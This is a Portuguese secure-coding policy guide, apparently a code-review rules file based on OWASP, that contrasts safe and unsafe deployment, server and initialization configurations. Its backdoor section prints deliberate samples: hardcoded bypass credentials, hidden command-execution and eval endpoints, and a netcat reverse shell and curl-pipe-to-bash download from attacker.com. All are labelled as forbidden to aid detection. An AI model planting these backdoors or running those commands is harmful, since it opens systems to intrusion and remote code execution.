# Políticas de Segurança - Deployment Configuration, Server Configuration e Potential Backdoor

> Baseado em: [OWASP Security Misconfiguration](https://owasp.org/www-project-top-ten/), [OWASP Docker Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html), [OWASP Infrastructure as Code Security](https://cheatsheetseries.owasp.org/cheatsheets/Infrastructure_as_Code_Security_Cheat_Sheet.html)

## VIOLAÇÕES CRÍTICAS (Falha automática)
- Debug/dev mode habilitado em produção → Desabilitar
- Portas desnecessárias expostas → Fechar portas não utilizadas
- Containers rodando como root → Usar usuário não-privilegiado
- Código morto com funcionalidades ocultas → Remover antes de deploy
- Endpoints administrativos sem autenticação → Proteger com auth forte
- Backdoors ou bypass de autenticação no código → Remover imediatamente

---

## DEPLOYMENT CONFIGURATION

### YAML (Kubernetes/Docker Compose)

```yaml
# ✅ CORRETO - Kubernetes deployment seguro
apiVersion: apps/v1
kind: Deployment
metadata:
  name: app
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
      containers:
        - name: app
          image: myapp:1.2.3  # Tag específica, nunca :latest
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
          resources:
            limits:
              memory: "512Mi"
              cpu: "500m"
            requests:
              memory: "256Mi"
              cpu: "250m"
          livenessProbe:
            httpGet:
              path: /actuator/health
              port: 8080
          env:
            - name: DB_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: db-secrets
                  key: password

# ❌ ERRADO - Deployment inseguro
spec:
  containers:
    - name: app
      image: myapp:latest  # Tag mutável!
      securityContext:
        privileged: true  # Container privilegiado!
      env:
        - name: DB_PASSWORD
          value: "plaintext-password"  # Segredo em plaintext!
```

```yaml
# ✅ CORRETO - Docker Compose seguro
services:
  app:
    image: myapp:1.2.3
    user: "1000:1000"
    read_only: true
    security_opt:
      - no-new-privileges:true
    deploy:
      resources:
        limits:
          memory: 512M
          cpus: '0.5'
    environment:
      - DB_PASSWORD_FILE=/run/secrets/db_password
    secrets:
      - db_password
    ports:
      - "8080:8080"  # Apenas porta necessária
    networks:
      - internal

secrets:
  db_password:
    external: true

# ❌ ERRADO - Docker Compose inseguro
services:
  app:
    image: myapp:latest
    privileged: true
    network_mode: host  # Expõe todas as portas!
    environment:
      - DB_PASSWORD=production_password  # Segredo em plaintext!
```

### HCL (Terraform)

```hcl
# ✅ CORRETO - Security Group restritivo
resource "aws_security_group" "app" {
  name = "app-sg"

  # Apenas porta 443 aberta ao público
  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # SSH apenas de VPN
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/8"]  # Apenas rede interna
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# ✅ CORRETO - RDS com criptografia
resource "aws_db_instance" "main" {
  engine               = "postgres"
  instance_class       = "db.t3.medium"
  storage_encrypted    = true
  publicly_accessible  = false  # Não acessível publicamente
  deletion_protection  = true
  
  password = data.aws_secretsmanager_secret_version.db.secret_string
}

# ❌ ERRADO - Security Group aberto
resource "aws_security_group" "bad" {
  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # Todas as portas abertas ao mundo!
  }
}

# ❌ ERRADO - RDS público sem criptografia
resource "aws_db_instance" "bad" {
  publicly_accessible = true   # Banco acessível da internet!
  storage_encrypted   = false  # Dados sem criptografia!
}
```

### Bash/Shell (Scripts de Deploy)

```bash
# ✅ CORRETO - Script de deploy seguro
#!/bin/bash
set -euo pipefail  # Falhar em erros, variáveis não definidas, pipes

# Verificar que não está em modo debug
if [[ "${DEBUG:-}" == "true" ]]; then
    echo "ERRO: Não executar deploy com DEBUG=true" >&2
    exit 1
fi

# Verificar variáveis obrigatórias
: "${DEPLOY_ENV:?DEPLOY_ENV não definida}"
: "${IMAGE_TAG:?IMAGE_TAG não definida}"

# Nunca usar :latest em produção
if [[ "$IMAGE_TAG" == "latest" && "$DEPLOY_ENV" == "production" ]]; then
    echo "ERRO: Não usar tag 'latest' em produção" >&2
    exit 1
fi

# ❌ ERRADO - Script inseguro
#!/bin/bash
docker run --privileged -p 0.0.0.0:22:22 myapp:latest  # Tudo errado!
```

### PowerShell (Scripts de Deploy)

```powershell
# ✅ CORRETO - Script de deploy seguro
$ErrorActionPreference = "Stop"
Set-StrictMode -Version Latest

# Verificar ambiente
if (-not $env:DEPLOY_ENV) {
    throw "DEPLOY_ENV não definida"
}

# Verificar que debug está desabilitado em produção
if ($env:DEPLOY_ENV -eq "production" -and $env:DEBUG -eq "true") {
    throw "Não executar deploy de produção com DEBUG habilitado"
}

# ❌ ERRADO - Sem validação
docker run --privileged myapp:latest  # Inseguro!
```

---

## SERVER CONFIGURATION

### YAML (application.yml / nginx)

```yaml
# ✅ CORRETO - Spring Boot produção
spring:
  profiles:
    active: production
  jpa:
    show-sql: false  # Nunca em produção
    open-in-view: false

server:
  error:
    include-message: never
    include-stacktrace: never
    include-exception: false
  server-header: ""  # Não revelar tecnologia

management:
  endpoints:
    web:
      exposure:
        include: health,info,metrics  # Apenas endpoints necessários
  endpoint:
    health:
      show-details: never
    env:
      enabled: false  # Desabilitar endpoint de env
    beans:
      enabled: false

# ❌ ERRADO - Configuração insegura
spring:
  jpa:
    show-sql: true  # Expõe queries SQL!
  devtools:
    restart:
      enabled: true  # DevTools em produção!

management:
  endpoints:
    web:
      exposure:
        include: "*"  # Todos os endpoints expostos!
```

```yaml
# ✅ CORRETO - Nginx seguro
server {
    listen 443 ssl http2;
    server_name app.example.com;
    
    # Ocultar versão
    server_tokens off;
    
    # Headers de segurança
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "0" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Desabilitar métodos desnecessários
    if ($request_method !~ ^(GET|POST|PUT|DELETE|PATCH)$) {
        return 405;
    }
    
    # Bloquear acesso a arquivos sensíveis
    location ~ /\. { deny all; }
    location ~ \.(env|git|svn|htaccess) { deny all; }
}

# ❌ ERRADO - Nginx inseguro
server {
    listen 80;  # Sem HTTPS!
    server_tokens on;  # Expõe versão!
    autoindex on;  # Listagem de diretórios!
}
```

### JSON (package.json / tsconfig)

```json
{
  "scripts": {
    "start": "node dist/main.js",
    "start:dev": "nest start --watch",
    "build": "nest build"
  },
  "engines": {
    "node": ">=20.0.0"
  }
}
```

```json
// ✅ CORRETO - tsconfig.json com strict mode
{
  "compilerOptions": {
    "strict": true,
    "noImplicitAny": true,
    "strictNullChecks": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true
  }
}
```

---

## POTENTIAL BACKDOOR

### Todas as linguagens - Padrões PROIBIDOS

```csharp
// ❌ PROIBIDO - Bypass de autenticação
if (username == "admin" && password == "master_override") // BACKDOOR!
    return AuthResult.Success;

// ❌ PROIBIDO - Endpoint oculto sem auth
[HttpGet("/debug/reset-all")]  // BACKDOOR!
public IActionResult ResetAll() => Ok(_db.Database.EnsureDeleted());

// ❌ PROIBIDO - Condição de bypass
if (request.Headers.ContainsKey("X-Debug-Bypass")) // BACKDOOR!
    return next();
```

```java
// ❌ PROIBIDO - Credencial de bypass
if ("superadmin".equals(username) && "backdoor123".equals(password)) {
    return createAdminSession(); // BACKDOOR!
}

// ❌ PROIBIDO - Endpoint de debug em produção
@GetMapping("/internal/exec")
public String executeCommand(@RequestParam String cmd) {
    return Runtime.getRuntime().exec(cmd); // BACKDOOR + RCE!
}

// ❌ PROIBIDO - Flag oculta que desabilita segurança
if (System.getenv("DISABLE_AUTH") != null) {
    return; // BACKDOOR!
}
```

```typescript
// ❌ PROIBIDO - Token mágico que bypassa auth
if (req.headers['x-magic-token'] === 'secret-bypass-token') {
    req.user = { id: 'admin', role: 'superadmin' }; // BACKDOOR!
    return next();
}

// ❌ PROIBIDO - Rota oculta
app.get('/__hidden_admin__', (req, res) => { // BACKDOOR!
    res.json(getAllSecrets());
});
```

```python
# ❌ PROIBIDO - Bypass de autenticação
if username == "debug_user" and password == "debug_pass":
    return create_admin_token()  # BACKDOOR!

# ❌ PROIBIDO - Execução remota de código
@app.route('/debug/eval', methods=['POST'])
def debug_eval():
    return str(eval(request.data))  # BACKDOOR + RCE!
```

```bash
# ❌ PROIBIDO - Shell reverso ou acesso remoto oculto
nc -e /bin/bash attacker.com 4444  # BACKDOOR!
curl http://attacker.com/payload | bash  # BACKDOOR!
```

### Como Detectar Backdoors - Checklist

- [ ] Buscar por credenciais hardcoded (strings como "admin", "master", "bypass", "debug")
- [ ] Verificar endpoints não documentados (rotas com "debug", "internal", "hidden", "test")
- [ ] Procurar condições que desabilitam segurança (if disable_auth, if bypass)
- [ ] Verificar headers customizados que alteram fluxo de autenticação
- [ ] Auditar variáveis de ambiente que desabilitam controles
- [ ] Revisar código que executa comandos ou eval com entrada externa
- [ ] Verificar dependências não reconhecidas ou com nomes suspeitos

---

## UNTRUSTED INITIALIZATION e UNTRUSTED SEARCH PATH

### Todas as linguagens

```java
// ✅ CORRETO - Carregar configuração de path confiável
@Value("${app.config.path:/etc/myapp/config.yml}")
private String configPath;

// ❌ ERRADO - Carregar de path controlável pelo usuário
String configPath = System.getenv("CONFIG_PATH"); // Pode apontar para arquivo malicioso
Properties props = new Properties();
props.load(new FileInputStream(configPath)); // Untrusted initialization!
```

```python
# ✅ CORRETO - Importar apenas de paths confiáveis
import importlib
ALLOWED_PLUGINS = {'plugin_a', 'plugin_b', 'plugin_c'}

def load_plugin(name: str):
    if name not in ALLOWED_PLUGINS:
        raise ValueError(f"Plugin não permitido: {name}")
    return importlib.import_module(f"myapp.plugins.{name}")

# ❌ ERRADO - Importar módulo de path não confiável
import sys
sys.path.insert(0, user_provided_path)  # Untrusted search path!
import user_module  # Pode carregar código malicioso!
```

```typescript
// ✅ CORRETO - Whitelist de módulos permitidos
const ALLOWED_MODULES = new Set(['moduleA', 'moduleB']);

function loadModule(name: string) {
    if (!ALLOWED_MODULES.has(name)) {
        throw new Error(`Módulo não permitido: ${name}`);
    }
    return require(`./modules/${name}`);
}

// ❌ ERRADO - require dinâmico com entrada do usuário
const mod = require(userInput); // Untrusted initialization!
```

```bash
# ✅ CORRETO - Usar paths absolutos
/usr/local/bin/mycommand --config /etc/myapp/config.yml

# ❌ ERRADO - Depender de PATH que pode ser manipulado
mycommand --config config.yml  # Se PATH for alterado, executa binário malicioso!
```

```powershell
# ✅ CORRETO - Usar path absoluto para executáveis
& "C:\Program Files\MyApp\tool.exe" -config "C:\etc\config.yml"

# ❌ ERRADO - Depender de PATH
& tool.exe -config $userPath  # PATH manipulation + untrusted config!
```

---

## TIME AND STATE (Race Conditions)

### C# (.NET)

```csharp
// ✅ CORRETO - Lock para operações críticas
private static readonly SemaphoreSlim _lock = new(1, 1);

public async Task<bool> TransferFunds(Guid fromId, Guid toId, decimal amount)
{
    await _lock.WaitAsync();
    try
    {
        var from = await _accountRepo.GetById(fromId);
        if (from.Balance < amount) return false;
        
        from.Balance -= amount;
        var to = await _accountRepo.GetById(toId);
        to.Balance += amount;
        
        await _context.SaveChangesAsync();
        return true;
    }
    finally
    {
        _lock.Release();
    }
}
```

### Java

```java
// ✅ CORRETO - Transação com isolamento adequado
@Transactional(isolation = Isolation.SERIALIZABLE)
public void transferFunds(Long fromId, Long toId, BigDecimal amount) {
    Account from = accountRepository.findByIdWithLock(fromId); // SELECT FOR UPDATE
    
    if (from.getBalance().compareTo(amount) < 0) {
        throw new InsufficientFundsException();
    }
    
    Account to = accountRepository.findByIdWithLock(toId);
    from.setBalance(from.getBalance().subtract(amount));
    to.setBalance(to.getBalance().add(amount));
}

// ✅ CORRETO - Pessimistic lock
@Lock(LockModeType.PESSIMISTIC_WRITE)
@Query("SELECT a FROM Account a WHERE a.id = :id")
Account findByIdWithLock(@Param("id") Long id);
```

### TypeScript / JavaScript

```typescript
// ✅ CORRETO - Transação atômica com Prisma
async function transferFunds(fromId: string, toId: string, amount: number) {
    await prisma.$transaction(async (tx) => {
        const from = await tx.account.findUniqueOrThrow({ where: { id: fromId } });
        
        if (from.balance < amount) {
            throw new Error('Saldo insuficiente');
        }
        
        await tx.account.update({
            where: { id: fromId },
            data: { balance: { decrement: amount } }
        });
        
        await tx.account.update({
            where: { id: toId },
            data: { balance: { increment: amount } }
        });
    });
}
```

### Python

```python
# ✅ CORRETO - Transação com lock (Django)
from django.db import transaction
from django.db.models import F

@transaction.atomic
def transfer_funds(from_id: int, to_id: int, amount: Decimal):
    # select_for_update previne race condition
    from_account = Account.objects.select_for_update().get(id=from_id)
    
    if from_account.balance < amount:
        raise InsufficientFundsError()
    
    Account.objects.filter(id=from_id).update(balance=F('balance') - amount)
    Account.objects.filter(id=to_id).update(balance=F('balance') + amount)
```

## Referências
- [OWASP Docker Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [OWASP Infrastructure as Code Security](https://cheatsheetseries.owasp.org/cheatsheets/Infrastructure_as_Code_Security_Cheat_Sheet.html)
- [OWASP Kubernetes Security](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [OWASP CI/CD Security](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
